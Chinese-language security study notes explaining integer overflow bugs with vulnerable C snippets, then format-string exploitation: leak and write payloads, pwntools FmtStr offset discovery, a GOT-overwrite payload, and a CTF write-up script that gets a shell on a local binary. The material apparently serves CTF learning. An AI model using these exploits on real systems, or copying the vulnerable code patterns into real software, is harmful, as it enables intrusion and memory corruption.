###整数溢出
如果一个整数用来计算一些敏感数值，如缓冲区大小或者数值索引，就会产生潜在的危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执行，但是它会导致栈溢出和堆溢出。
整数溢出的异常情况有三种：
(1)溢出，只有有符号数才会发生溢出,有符号数最高位表示符号，在两正或俩负相加时，有可能改变符号位的值，产生溢出，溢出标志位OF可能检测有符号数的溢出.
(2)回绕，无符号数0减1时会发生最大的数，如1字节的无符号数会变成255，而255+1会变成最小数0.进位标志CF可检测无符号数回绕.
(3)截断，将一个较大宽度的数存入一个宽度较小的操作数中，高位发生截断.


typedef unsigned int size_t;size_t是无符号整数类型的sizeof()的结果.

整数溢出实例：

int len = read_int_from_network();
char* p = read_string_from_network();
if(len>80){error("too long");}
memcpy(buf,p,len)
1.如果攻击者给len赋一个负数，则可以绕过if,memcpy时负数len会被转换为一个无符号整数，于是变成了一个非常大的数，从而复制大量内容到buf，引发缓冲区溢出.

void func(){
size_t len;
char* buf;
len = read_int_from_network();
buf = malloc(len+5);
read(fd,buf,len);
}
2.如果len过大，len+5是有可能发生回绕的，比如在x86-32上，如果len=0xffffffff,则len+5=0x00000004;这时malloc(0x4),并且写入大量的内容，会发生缓冲区溢出.


void main(){
unsigned short int total;
total = strlen(argv[1])+strlen(argv[2])+1;
char* buf = (char*)malloc(total);
strcpy(buf,argv[1]);
strcat(buf,argv[2]);
}
3.截断，如果攻击者提供的俩个字符串总长度无法用total表示，就会发生截断，从而导致后面的缓冲区溢出。



void val_passwd(char* passwd){
char passwd_buf[11];
unsigned char passwd_len = strlen(passwd);
    if(passwd_len>=4 && passwd_len<=8)
    {
        printf("good");
        strcpy(passwd_buf,passwd);
    }
    else{
        printf("bad");
    }
}
int main(){
    val_passwd(argv[1]);
}
可以看到上面的strlen()返回类型是size_t,却被存储在无符号字符串类型中，任意超过无符号字符串最大上限值(256)的数据都会导致截断异常。当密码长度为261时，截断后值变为5，成功绕过if，导致栈溢出。


###格式化字符串
格式化字符串漏洞的利用主要有：使程序崩溃，栈溢出泄漏，任意地址内存泄漏，任意地址内存覆盖，栈数据覆盖。
1.使程序崩溃，在linux中，存取无效的指针会使进程收到SIGEGV信号，从而使程序非正常终止并产生核心转储，其中转储了程序崩溃时的许多重要信息,而这些信息正是攻击所需要的。
printf("%s%s%s%s%s%s%s%s%s%s%s%s%s");
2.利用%n$x，%n$p可以泄漏栈上的数据内容，%n$s可以泄漏栈上指针指向的内容。
3.利用%n$n 与%n$s类似，不同的是，n是写入，s是泄漏。%20c一次打印20的空格，配合%n$n一起使用可以实现任意地址写入.
4.x64中的格式化字符串需要注意的是linux的前六个参数分别通过，rdi，rsi，rdx，rcx，r8，r9进行传参，那么格式化字符串的参数应该是第5个。

利用：利用格式化字符串泄漏canary的值，并且在栈溢出时填充上去，从而覆盖返回地址，跳转到canary_protect_me()函数获得shell

fmtstr模块
求偏移
在Fmtstr中，我们可以这样做，如下代码所示，这里对DynELF类熟悉的同学可以类比一下，关键注意exec_fmt函数中需要p = process("./pwn")，因为这里同样采用的是循环暴力求解，即每次增加一个%p，然后用正则化表达式去匹配定位字符串是否出现，以此来求得偏移值。另外由于该类使用的是正则匹配的方式，所以在求解偏移时，即使漏洞前后有一些输出打印干扰都不会影响偏移的求解，我们会在下面的例子中看到。

def exec_fmt(pad):
	p = process("./pwn")
	# send 还是 sendline以程序为准
	p.send(pad)
	return p.recv()

fmt = FmtStr(exec_fmt)
print("offset ===> ", fmt.offset)

当然如果pwn题中的格式化字符串漏洞采用了循环的方式，如下代码所示，那么就不需要在函数使用process，因为题目自身实现了循环。
while(1)
{
	read(0, buf, 0x100);
	printf(buf);
}

任意地址写
# fmtstr_payload(offset, writes, numbwritten=0, write_size="byte")
# 总共四个参数：
# offset --> 偏移量 
# writes --> {被覆盖的地址:要写入的地址} 地址都为int型，也就是不需要使用p32或者p64打包
# numbwritten --> 已经由printf函数写入的字节数，默认为0
# write_size --> 逐byte/short/int写入，默认是byte，这样发送的字节少
pro = ELF("./pwn")
printf_got = pro.got["printf"]
system_plt = pro.plt["system"]
pad = fmtstr_payload(offset, {printf_got:system_plt})
p.send(pad)

一个writeup
这里进行漏洞利用的思路也很明确，因为/dev/urandom产生的是随机值，我们肯定是无法直接估计的，所以要利用格式化字符串漏洞对0x804c044的值改写成和我们输入的passwd一样的值，即可获取到shell。
from pwn import *
def exec_fmt(pad):
    p = process("./pwn_5")
    p.send(pad)
    # 在printf(buf)前后都有printf输出，这里是否recv都不会影响偏移求解
    # p.recvuntil("Hello,")
    info = p.recv()
    return info

fmt = FmtStr(exec_fmt)
offset = fmt.offset
print("offset ===> ", offset)
p = process("./pwn_5")
bss_ad = 0x0804C044
pad = fmtstr_payload(offset, {bss_ad:1})
p.send(pad)
p.recvuntil("your passwd:")
p.send("1")
p.interactive()






